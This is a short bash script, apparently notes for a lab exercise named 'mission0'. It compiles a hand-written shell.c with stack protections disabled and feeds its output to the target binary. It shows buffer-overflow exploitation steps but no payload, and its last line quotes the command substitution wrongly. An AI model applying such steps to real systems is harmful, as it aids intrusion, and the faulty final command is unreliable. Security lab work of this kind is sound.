#!/bin/bash
cd writable
nano shell.c

#Into the nano write the code into shell.c file

#Compile the new file
gcc -m32 -no-pie -fno-stack-protector -z execstack -o shell shell.c

#Execute the new file saving the result into a .txt file
./shell > ishell.txt

#Go back to the mission0 directory
cd ..

#Execute mission0 giving as input the result saved in ishell.txt
./mission0 "$ cat ishell.txt" 